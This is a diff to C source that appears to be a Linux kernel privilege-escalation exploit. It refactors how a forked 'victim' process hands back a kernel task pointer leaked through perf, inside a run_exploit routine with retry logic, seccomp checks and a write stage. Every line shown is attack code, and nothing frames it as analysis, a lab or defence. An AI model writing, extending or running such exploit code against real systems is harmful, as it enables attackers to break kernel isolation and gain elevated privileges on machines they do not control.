@@ -821,6 +821,17 @@ static pid_t spawn_child(struct child_pipes *p) {
   return child;
 }
 
+/* Fork the victim and read back the task pointer perf leaked. */
+static pid_t spawn_victim(struct child_pipes *p, uintptr_t *task_out) {
+  pid_t child = spawn_child(p);
+  if (child < 0) return -1;
+  uintptr_t task = 0;
+  read(p->task_r, &task, sizeof(task));
+  close(p->task_r);
+  *task_out = task;
+  return child;
+}
+
 typedef int (*write_stage_verify_fn)(void *context);
 
 static int retry_write_stage(
@@ -1001,15 +1012,11 @@ int run_exploit(int argc, char **argv) {
       seccomp_ok = 0;
     }
 
-    child = spawn_child(&pipes);
+    child = spawn_victim(&pipes, &child_task);
     if (child < 0) {
       pr_warning("fork failed\n");
       return 1;
     }
-
-    child_task = 0;
-    read(pipes.task_r, &child_task, sizeof(child_task));
-    close(pipes.task_r);
     TIMER("perf_find_task done");
 
     if (!child_task) {
@@ -1017,9 +1024,11 @@ int run_exploit(int argc, char **argv) {
       pr_warning("perf leak did not reproduce; retrying next round\n");
       kill(-child, SIGKILL);
       waitpid(child, NULL, 0);
+
       child_alive = 0;
       close(pipes.cmd_w); close(pipes.uid_r);
       continue;
+
     }
 
     pr_info("child_pid=%d child_task=0x%016zx\n", child, child_task);
